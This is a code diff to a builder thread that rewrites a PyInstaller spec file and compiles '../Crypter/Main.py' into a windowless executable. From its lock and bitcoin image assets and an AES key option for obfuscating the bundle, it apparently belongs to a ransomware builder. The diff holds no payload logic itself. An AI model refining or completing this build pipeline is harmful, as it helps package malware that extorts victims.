@@ -11,6 +11,7 @@ import json
 import subprocess
 from threading import Thread, Event
 from pubsub import pub
+import re
 
 # Import package modules
 from .Base import *
@@ -189,7 +190,46 @@ class BuilderThread(Thread):
                                            debug_level=1)
                 self.__create_runtime_config()
                 spec_path = self.__create_spec_file()
+                print('SPEC_PATH')
+                print(spec_path)
+                                # Read the file and store lines in a list
+                with open(spec_path, 'r') as file:
+                    lines = file.readlines()
+
+                # Modify the line containing the word 'analysis'
+                # Modify the line containing 'a = Analysis(['
+                for i, line in enumerate(lines):
+                    if line.strip().startswith('a = Analysis(['):
+                        # Find the start and end indices of the script name
+                        start_index = line.find('[') + 2  # account for [' opening
+                        end_index = line.find(']') - 1  # account for '] closing
+                        # Replace the script name with the new_script_name variable
+                        # Use forward slashes for the path
+                        new_path = '../Crypter/Main.py'.replace(os.sep, '/')
+                        lines[i] = line[:start_index] + new_path + line[end_index:]
+                    if 'datas=[' in line:
+                        # Assuming the datas list is formatted exactly as shown
+                        start_index = line.find('(') + 2  # Find the index after the opening quote
+                        end_index = line.find('",')  # Find the index of the closing quote
+                        lines[i] = line[:start_index] + '../CrypterBuilder/Resources/lock.bmp'.replace(os.sep, '/') + line[end_index:]
+                    if 'CrypterBuilder/Resources/bitcoin.bmp' in line:
+                        start_index = line.find('(') + 2  # Find the index after the opening quote
+                        end_index = line.find('",')  # Find the index of the closing quote
+                        lines[i] = line[:start_index] + '../CrypterBuilder/Resources/bitcoin.bmp'.replace(os.sep, '/') + line[end_index:]
+                    if 'CrypterBuilder/Resources/lock.ico' in line:
+                        start_index = line.find('(') + 2  # Find the index after the opening quote
+                        end_index = line.find('",')  # Find the index of the closing quote
+                        lines[i] = line[:start_index] + '../CrypterBuilder/Resources/lock.ico'.replace(os.sep, '/') + line[end_index:]
+                    if 'CrypterBuilder/Resources/runtime.cfg' in line:
+                        start_index = line.find('(') + 2  # Find the index after the opening quote
+                        end_index = line.find('",')  # Find the index of the closing quote
+                        lines[i] = line[:start_index] + '../CrypterBuilder/Resources/runtime.cfg'.replace(os.sep, '/') + line[end_index:]
+
+                # Write the modified lines back to the file
+                with open(spec_path, 'w') as file:
+                    file.writelines(lines)
                 self.__run_pyinstaller(spec_path)
+
                 self.__move_binary()
 
             # If not error, set success
@@ -272,16 +312,27 @@ class BuilderThread(Thread):
         self.__console_log(msg="Calling PyInstaller. Please wait...")
 
         # Get PyInstaller location
-        pyinstaller_path = os.path.join(os.path.dirname(sys.executable), "pyinstaller.exe")
+        # pyinstaller_path = os.path.join(os.path.dirname(sys.executable), "pyinstaller.exe")
+        # print(pyinstaller_path)
+        # if not os.path.isfile(pyinstaller_path):
+        # self.__console_log("PyInstaller not found at '%s'. Making system wide call instead" % pyinstaller_path,
+        #                     debug_level=2)
+        
+                # Ensure PyInstaller path is correct
+        pyinstaller_path = os.path.join('../venv', 'Scripts', 'pyinstaller.exe')
+        print(sys.prefix)
+        print(pyinstaller_path)
         if not os.path.isfile(pyinstaller_path):
-            self.__console_log("PyInstaller not found at '%s'. Making system wide call instead" % pyinstaller_path,
-                               debug_level=2)
-            pyinstaller_path = "pyinstaller"
-        else:
-            self.__console_log("PyInstaller found at '%s'" % pyinstaller_path,
-                               debug_level=2)
+            pyinstaller_path = 'pyinstaller'  # Fallback to assuming it's in the PATH
+
+        # else:
+        #     self.__console_log("PyInstaller found at '%s'" % pyinstaller_path,
+        #                        debug_level=2)
 
         # Build command
+        spec_path = os.path.abspath(spec_path)
+        print(spec_path)
+
         cmd = [
             pyinstaller_path,
             '--noconsole',
@@ -300,18 +351,18 @@ class BuilderThread(Thread):
                            
         
         # Call PyInstaller subprocess
-        try:
-            build = subprocess.Popen(cmd,
-                          stdout=subprocess.PIPE,
-                          stderr=subprocess.STDOUT,
-                          creationflags=0x08000000 # To prevent console window opening
-                        )
-        except WindowsError as we:
-            raise BuildFailure(
-                ERROR_FILE_NOT_FOUND,
-                "Call to PyInstaller failed. Check that PyInstaller is installed and can be found"
-                " on the system path"
-            )
+        
+        build = subprocess.Popen(cmd,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.STDOUT,
+                        # creationflags=0x08000000 # To prevent console window opening
+                    )
+        # except WindowsError as we:
+        #     raise BuildFailure(
+        #         ERROR_FILE_NOT_FOUND,
+        #         "Call to PyInstaller failed. Check that PyInstaller is installed and can be found"
+        #         " on the system path"
+        #     )
 
         while True:
             # Check for stop
@@ -326,6 +377,8 @@ class BuilderThread(Thread):
                                    debug_level=1)
             else:
                 break
+
+        
         
     
     def __create_spec_file(self):
@@ -337,7 +390,12 @@ class BuilderThread(Thread):
             raise UserHalt
 
         self.__console_log(msg="Creating PyInstaller SPEC file")
+        script_path = os.path.abspath("../Crypter/Main.py")
         spec = Spec()
+        
+        print(script_path)
+        # Set script path
+        
         # PI AES key
         if self.user_input_dict["pyinstaller_aes_key"] and not self.__stop_event.isSet():
             spec.set_cipher_key(self.user_input_dict["pyinstaller_aes_key"])
@@ -365,7 +423,7 @@ class BuilderThread(Thread):
             self.__console_log(msg="SPEC file successfully created")
         else:
             raise UserHalt
-        
+        print(spec_path)
         return spec_path
         
     
